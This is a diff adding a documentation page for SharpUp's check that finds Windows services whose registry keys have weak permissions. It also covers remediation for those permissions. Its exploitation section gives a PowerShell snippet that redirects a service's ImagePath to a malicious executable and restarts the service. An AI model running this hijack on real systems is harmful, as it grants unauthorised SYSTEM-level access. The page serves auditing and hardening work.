@@ -1,0 +1,67 @@
+---
+title: 'Modifiable Service Registry Keys'
+description: 'Service registry keys with weak permissions'
+icon: 'key'
+---
+
+## Overview
+
+The Modifiable Service Registry Keys check identifies Windows services where the registry key under `HKLM:\SYSTEM\CurrentControlSet\Services\` has weak permissions. If a user can modify a service's registry key, they can change service configuration including the executable path, achieving privilege escalation.
+
+## How It Works
+
+SharpUp enumerates all services and checks registry permissions:
+
+1. Get list of all services
+2. For each service, check `HKLM:\SYSTEM\CurrentControlSet\Services\[ServiceName]`
+3. Evaluate if current user has write permissions to the key
+4. Report vulnerable services with their state and startup mode
+
+## Example Output
+
+```
+=== Services with Modifiable Registry Keys ===
+    Service 'VulnSvc' (State: Running, StartMode: Automatic) : SYSTEM\CurrentControlSet\Services\VulnSvc
+```
+
+## Exploitation
+
+```powershell
+# Modify service ImagePath to run malicious executable
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\VulnSvc" `
+    -Name "ImagePath" `
+    -Value "C:\temp\malicious.exe"
+
+# Restart service
+Restart-Service -Name VulnSvc
+```
+
+## Remediation
+
+<Steps>
+  <Step title="Fix Registry Permissions">
+    ```powershell
+    $serviceName = "VulnSvc"
+    $keyPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
+
+    $acl = Get-Acl $keyPath
+    $acl.Access | Where-Object {
+        $_.IdentityReference -notmatch "SYSTEM|Administrators|TrustedInstaller" -and
+        $_.RegistryRights -match "WriteKey|SetValue|CreateSubKey"
+    } | ForEach-Object { $acl.RemoveAccessRule($_) }
+
+    Set-Acl $keyPath $acl
+    ```
+  </Step>
+</Steps>
+
+## Related Checks
+
+<CardGroup cols={2}>
+  <Card title="Modifiable Services" icon="gear" href="/ghostpack-docs/SharpUp-mdx/checks/modifiableservices">
+    Services with weak DACL permissions
+  </Card>
+  <Card title="Modifiable Service Binaries" icon="file-binary" href="/ghostpack-docs/SharpUp-mdx/checks/modifiableservicebinaries">
+    Service executables with weak permissions
+  </Card>
+</CardGroup>
